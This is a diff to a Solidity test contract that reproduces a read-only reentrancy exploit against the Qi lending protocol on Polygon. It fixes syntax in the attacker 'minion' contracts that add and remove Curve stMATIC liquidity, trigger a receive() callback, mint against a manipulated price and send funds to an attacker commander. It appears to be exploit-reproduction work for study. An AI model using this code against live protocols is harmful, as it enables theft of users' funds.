@@ -156,6 +156,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
     uint256 priceAfterCallback;
 
     Attacker_Minion_One internal minionOne;
+    Attacker_Minion_Two internal minionTwo;
 
     // In reality, the attacker used some minion contracts which they deployed from their
     // main contract to execute the attacks. Here, we simplify and use only one contract
@@ -324,18 +325,14 @@ contract Attacker_Minion_One {
         );
 
         // Add Liquidity to Curve Pool
-        uint256[] memory _amounts = new uint256[](2);
-        _amounts[0] = initialWMaticBalance;
-        _amounts[1] = initialStLidoMaticBalance;
-
         console.log("===== 5.1 Add Liquidity to Curve =====");
 
-        CURVE_STMATIC_POOL.add_liquidity(_amounts, 0, false);
+        CURVE_STMATIC_POOL.add_liquidity([initialWMaticBalance, initialStLidoMaticBalance], 0, false);
 
         // Enter market
         address[] memory _markets = new address[](1);
-        _markets = address(STMATIC_MATIC_DELEGATOR);
-        unitroller.enterMarkets(_markets);
+        _markets[0] = address(STMATIC_MATIC_DELEGATOR);
+        UNITROLLER.enterMarkets(_markets);
 
         // Deposit and Mint
         console.log("===== 5.2 Deposit and Mint =====");
@@ -344,20 +341,20 @@ contract Attacker_Minion_One {
 
         uint256 stMaticBalance = STMATIC_MATIC_POOL.balanceOf(address(this));
         STMATIC_MATIC_POOL.approve(address(STMATIC_MATIC_DELEGATOR), stMaticBalance);
-        STMATIC_MATIC_DELEGATOR.mint(stMaticBalance)   
+        STMATIC_MATIC_DELEGATOR.mint(stMaticBalance);
 
         // Remove liquidity - by setting 'use_eth = true', it will trigger the logic inside receive().
         console.log("===== 5.2 Deposit and Mint =====");
-        uint256[2] memory minAmounts = [ 0, 0];
-        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this), minAmounts, /*use_eth*/ true);
+        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
+        CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, /*use_eth*/ true);
 
         console.log("===== 5.4 Transfer LP Token to Attacker Contract =====");
         // This step is curious since the amount transferred is zero... pseudo-automated attack?
         CURVE_STMATIC_LP_TOKEN.transfer(ATTACKER_COMMANDER, CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)));
 
         console.log("===== 5.5 Transfer Natives to Attacker Contract =====");
-        (bool success, ) = ATTACKER_COMMANDER.call{address(this).balance}('');
-        require(success, 'native tx fail: Minion 1 to Commander')
+        (bool success, ) = ATTACKER_COMMANDER.call{value: address(this).balance}('');
+        require(success, 'native tx fail: Minion 1 to Commander');
 
         console.log("===== 5.6 Transfer WMATIC to Attacker Contract =====");
         // Same comment as 5.4
@@ -379,7 +376,7 @@ contract Attacker_Minion_One {
 
 
 contract Attacker_Minion_Two {
-    
+
     address internal immutable ATTACKER_COMMANDER;
 
     constructor(address _attackerCommander){
